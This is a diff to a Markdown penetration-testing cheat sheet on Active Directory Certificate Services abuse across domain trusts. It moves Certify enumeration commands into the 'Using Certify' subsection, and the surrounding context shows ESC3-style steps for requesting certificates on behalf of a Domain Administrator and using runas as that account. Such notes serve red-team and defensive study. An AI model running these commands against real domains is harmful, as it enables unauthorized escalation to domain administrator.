@@ -2102,11 +2102,6 @@ Abuse with Rubeus
 
 ### Across domain trusts - Active Directory Certificate Services (AD CS)
 
-- Use [Certify](https://github.com/GhostPack/Certify) to enumerate AD CS in the target forest
-  - `Certify.exe cas`
-  - Enumerate the templates: `Certify.exe find`
-  - Enumerate vulnerable templates: `Certify.exe find /vulnerable`
-
 **Escalation to DA**
 1. Template enumeration
    - Enumarate all the templates
@@ -2141,6 +2136,10 @@ Abuse with Rubeus
    - `runas /user:lunar.eruca.com\<DA_username> cmd.exe`
 
 **Using Certify**
+- Use [Certify](https://github.com/GhostPack/Certify) to enumerate AD CS in the target forest
+  - `Certify.exe cas`
+  - Enumerate the templates: `Certify.exe find`
+  - Enumerate vulnerable templates: `Certify.exe find /vulnerable`
 - Request a certificate for Certificate Request Agent from TemplateTarget-Agent template.
   - `Certify.exe request /ca:<CA_Server>\<CA_Name> /template:TemplateTarget-Agent`
 - Convert the cert.pem file to pfx format, named esc3agent.pfx, and utilize it to request a certificate on behalf of the Domain Administrator (DA) using the "TemplateTarget-Users" template.
